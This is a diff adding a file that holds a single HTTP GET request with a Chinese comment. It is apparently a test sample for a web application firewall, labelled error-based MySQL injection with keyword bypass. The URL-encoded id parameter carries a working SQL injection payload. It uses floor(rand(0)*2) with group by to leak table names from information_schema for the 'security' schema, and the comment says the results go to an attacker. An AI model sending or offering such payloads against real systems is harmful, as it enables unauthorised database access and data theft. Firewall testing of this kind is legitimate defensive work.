@@ -1,0 +1,9 @@
+# SQL注入_GET_mysql_报错注入(等价关键字绕过)-06506277
+# 基于报错盲注进行等价关键字绕过注入，该SQL注入语句的目的是获取数据库中的表名，并将结果发送给攻击者。子查询 (select (select (select concat(0x7e,table_name,0x7e))) from information_schema.tables where table_schema=0x7365637572697479 limit 0,1)。在information_schema.tables表中，通过where table_schema=0x7365637572697479过滤出目标数据库的表信息。使用concat函数将0x7e（波浪符号）和表名进行拼接，以便在结果中进行标记（例如~tablename~）。外层子查询：(select 1 from (select count(*),concat(...),floor(rand(0)*2))x from information_schema.tables group by x)a)。在information_schema.tables表中进行聚合查询，将子查询的结果作为中间表别名为x。使用count(*)计算表的总数，floor(rand(0)*2)生成随机数并向下取整，concat(...)拼接表名，并将结果作为列。
+GET /?id=1%20and%28select%201%20from%28select%20count%28%2A%29%2Cconcat%28%28select%20%28select%20%28select%20concat%280x7e%2Ctable_name%2C0x7e%29%29%29%20from%20information_schema.tables%20where%20table_schema=0x7365637572697479%20%20limit%200%2C1%29%2Cfloor%28rand%280%29%2A2%29%29x%20from%20information_schema.tables%20group%20by%20x%29a%29&bid=hd_tag_m8mv24bt HTTP/1.1
+Host: www.swaf.com
+RM-PRO-BusinessID: hd_tag_m8mv24bt
+RM-PRO-Token: 38ea25831380a3badcdb5c46ec3c1e64
+RM-PRO-Time: 1742808373656
+User-Agent: curl/7.83.1
+
